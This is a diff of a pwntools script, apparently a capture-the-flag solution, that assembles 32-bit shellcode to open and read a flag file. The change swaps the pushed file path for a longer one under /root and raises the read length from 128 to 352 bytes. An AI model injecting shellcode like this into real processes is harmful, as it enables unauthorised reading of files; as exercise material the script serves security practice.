@@ -2,17 +2,24 @@ from pwn import *
 
 
 shell_code = asm('\n'.join([
-    'push %d' % u32('ag\0\0'),
-    'push %d' % u32('w/fl'),
-    'push %d' % u32('e/or'),
-    'push %d' % u32('/hom'), # Flag path
+    'push %d' % u32('.txt'),
+    'push %d' % u32('flag'),
+    'push %d' % u32('ode/'),
+    'push %d' % u32('ellc'),
+    'push %d' % u32('y_sh'),
+    'push %d' % u32('1bab'),
+    'push %d' % u32('ft/1'),
+    'push %d' % u32('ecso'),
+    'push %d' % u32('st/s'),
+    'push %d' % u32('t/te'),
+    'push %d' % u32('/roo'), # Flag path
     'mov edx, 0', # Mode
     'mov ecx, 0', # Open syscall flag
     'mov ebx, esp', # Buffer
     'mov eax, 5', # Open syscall number
     'int 0x80',
 
-    'mov edx, 128', # Count
+    'mov edx, 352', # Count
     'mov ecx, esp', # Buffer
     'mov ebx, eax', # fd
     'mov eax, 3', # Read syscall number
